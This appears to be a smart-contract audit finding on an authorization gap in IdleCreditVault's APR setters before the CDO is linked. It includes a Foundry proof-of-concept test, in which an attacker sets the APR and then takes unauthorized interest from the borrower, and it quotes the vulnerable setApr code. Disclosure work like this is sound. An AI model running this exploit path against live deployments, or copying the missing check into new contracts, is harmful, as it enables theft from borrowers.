### Title
Unlinked `IdleCreditVault` lets any account fix the borrower APR - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.setAprs` and `setAprsWithBuffer` are externally callable and delegate authorization to `setApr`. When `idleCDO` is still unset, `setApr` skips the CDO/manager check entirely, allowing any EOA to replace both APR values up to `DEFAULT_MAX_APR`. [1](#0-0) 

### Finding Description
`initialize` stores an initial APR but leaves `idleCDO` unset until `setWhitelistedCDO` is called. During that interval, the explicit authorization bypass in `setApr` treats every caller as trusted setup infrastructure. An attacker can call `setAprs(20e18, 20e18)` because `DEFAULT_MAX_APR` permits the value. [2](#0-1) [3](#0-2) 

After an honest owner links the CDO without rewriting the APR, `IdleCDOEpochVariant.startEpoch` uses the poisoned strategy APR to calculate `expectedEpochInterest`. [4](#0-3)  At stop, the CDO pulls that computed liability from the honest borrower through `getFundsFromBorrower`. [5](#0-4) 

The production `IdleCreditVaultFactory` avoids an externally exploitable window by calling `setAprs` and `setWhitelistedCDO` in the same deployment transaction. [6](#0-5)  The vulnerable contract nevertheless supports direct proxy deployment/configuration flows where initialization and CDO linking are separate transactions.

### Impact Explanation
An attacker who passes normal wallet checks can deposit after the poisoned strategy is linked, receive tranche tokens, and obtain interest calculated at the unauthorized fixed APR. The borrower must fund that inflated obligation, after which the attacker can withdraw the principal plus unauthorized yield.

At the maximum `20e18` scaled APR, a 1,000,000-unit deposit for a 30-day epoch creates approximately `16,438` units of unauthorized borrower interest, before any configured fees:

```text
1,000,000 * 20% * 30 / 365 = 16,438.356
```

The loss is borne directly by the honest borrower rather than by other lenders.

### Likelihood Explanation
Likelihood is deployment-dependent. The factory path is atomic and rewrites the APR before linking the CDO, so no public transaction gap exists there. The issue affects manual or previously supported deployment flows where an initialized strategy is left with `idleCDO == address(0)` before being attached to a CDO.

In such a flow, exploitation requires only one unprivileged transaction and later ordinary deposit and withdrawal calls. The owner and borrower can remain honest throughout.

### Recommendation
Do not expose APR mutation while `idleCDO` is unset. Require `msg.sender == owner()` in the pre-link branch, or make setup APR immutable and require the owner to initialize and link the CDO atomically. The same authorization rule should cover `setApr`, `setAprs`, and `setAprsWithBuffer`.

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";

contract TestUnderlying is ERC20 {
  constructor() ERC20("Test USD", "TUSD") {}

  function decimals() public pure override returns (uint8) {
    return 6;
  }

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

contract UnlinkedAprPoisoningTest is Test {
  TestUnderlying internal underlying;
  IdleCreditVault internal strategy;
  IdleCDOEpochVariant internal cdo;

  address internal attacker = makeAddr("attacker");
  address internal borrower = makeAddr("borrower");
  address internal manager = makeAddr("manager");
  address internal proxyAdmin = makeAddr("proxyAdmin");

  function setUp() public {
    vm.createSelectFork("mainnet");

    underlying = new TestUnderlying();

    // Strategy is initialized first, leaving idleCDO unset.
    IdleCreditVault strategyImpl = new IdleCreditVault();
    strategy = IdleCreditVault(address(new TransparentUpgradeableProxy(
      address(strategyImpl),
      proxyAdmin,
      abi.encodeWithSelector(
        IdleCreditVault.initialize.selector,
        address(underlying),
        address(this),
        manager,
        borrower,
        "Borrower",
        0
      )
    )));

    // The CDO can already exist, but the strategy authorization window remains
    // open until setWhitelistedCDO is invoked.
    IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
    cdo = IdleCDOEpochVariant(address(new TransparentUpgradeableProxy(
      address(cdoImpl),
      proxyAdmin,
      abi.encodeWithSelector(
        IdleCDOEpochVariant.initialize.selector,
        type(uint256).max,
        address(underlying),
        address(this),
        address(this),
        address(0),
        address(strategy),
        0
      )
    )));

    // Attacker poisons both APR values while setApr skips authorization.
    vm.prank(attacker);
    strategy.setAprs(20e18, 20e18);

    // Honest owner links the strategy but does not rewrite the APR.
    strategy.setWhitelistedCDO(address(cdo));
    cdo.setEpochParams(30 days, 1 days);
    cdo.setInstantWithdrawParams(1 days, 0, true);
    cdo.setKeyringParams(address(0), 0);
    cdo.setFeeParams(address(this), 0, 0, 0);
    cdo.setGuardian(manager);
  }

  function testUnlinkedStrategyAprTheft() public {
    uint256 depositAmount = 1_000_000e6;
    uint256 expectedUnauthorizedInterest =
      depositAmount * 2e17 * 30 days / (365 days * 1e18);

    underlying.mint(attacker, depositAmount);

    vm.startPrank(attacker);
    underlying.approve(address(cdo), depositAmount);
    cdo.depositAA(depositAmount);
    vm.stopPrank();

    cdo.startEpoch();
    assertEq(cdo.expectedEpochInterest(), expectedUnauthorizedInterest);

    // The borrower received the principal and honestly funds the recorded liability.
    underlying.mint(borrower, expectedUnauthorizedInterest);
    vm.prank(borrower);
    underlying.approve(address(cdo), depositAmount + expectedUnauthorizedInterest);

    vm.warp(cdo.epochEndDate() + 1);
    cdo.stopEpoch(0, 1); // close the pool and recall principal plus poisoned interest

    vm.startPrank(attacker);
    cdo.requestWithdraw(0, cdo.AATranche());
    cdo.claimWithdrawRequest();
    vm.stopPrank();

    assertApproxEqAbs(
      underlying.balanceOf(attacker),
      depositAmount + expectedUnauthorizedInterest,
      2
    );
    assertEq(underlying.balanceOf(borrower), 0);
  }
}

  /// @notice set both the unscaled APR and APR scaled by epoch plus buffer duration.
  /// @dev only CDO and manager can set the APR through `setApr`.
  /// @param _unscaledApr unscaled APR
  /// @param _duration epoch duration
  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
  }

  /// @notice set the fixed apr
  /// @dev only cdo and manager can set the apr. If manager manually set apr from 
  /// here it will not be scaled to include the buffer period
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
